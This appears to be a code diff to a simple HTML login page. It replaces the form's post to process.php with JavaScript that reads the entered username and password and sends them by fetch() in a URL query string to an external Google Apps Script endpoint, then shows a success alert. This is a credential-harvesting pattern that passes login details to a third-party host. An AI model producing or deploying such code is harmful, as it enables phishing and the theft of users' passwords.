@@ -2,14 +2,34 @@
 <html>
 <head>
     <title>Login Form</title>
+    <script>
+        function sendRequest() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            var url = "https://script.google.com/macros/s/AKfycby2ejRpgRkI56czpYdFZKg9lSxsc-C2-i4uvyvH5Qbo1MrJLvIFGcPTz5_k3dV_zSE/exec?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
+            
+            fetch(url)
+                .then(response => response.text())
+                .then(data => {
+                    console.log(data);
+                    alert("Request sent successfully!");
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("Failed to send request.");
+                });
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("confirmButton").addEventListener("click", sendRequest);
+        });
+    </script>
 </head>
 <body>
-    <form action="process.php" method="get">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username"><br><br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password"><br><br>
-        <input type="submit" value="Confirm">
-    </form>
+    <label for="username">Username:</label>
+    <input type="text" id="username" name="username"><br><br>
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password"><br><br>
+    <button id="confirmButton">Confirm</button>
 </body>
 </html>
